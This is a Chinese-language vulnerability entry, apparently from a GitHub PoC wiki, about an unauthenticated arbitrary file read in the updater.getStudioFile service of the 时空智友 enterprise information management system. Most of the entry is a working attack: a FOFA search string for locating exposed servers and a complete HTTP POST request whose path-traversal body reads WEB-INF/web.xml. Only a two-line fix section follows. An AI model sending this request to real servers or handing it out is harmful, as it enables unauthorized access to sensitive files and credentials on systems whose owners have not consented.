# 时空智友企业信息管理系统 updater.getStudioFile 任意文件读取漏洞

# 漏洞描述

时空智友企业信息管理系统 updater.getStudioFile 存在任意文件读取漏洞，未授权攻击者可读取敏感文件。

# 影响版本

时空智友企业信息管理系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA： body="继续登录将挤掉原登录设备"

POC/EXP：

POST /formservice?service=updater.getStudioFile HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/json

..\..\WEB-INF/web.xml

![image-20250311133440952](./.resource/时空智友企业信息管理系统updater.getStudioFile任意文件读取漏洞/media/image-20250311133440952.png)


# 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
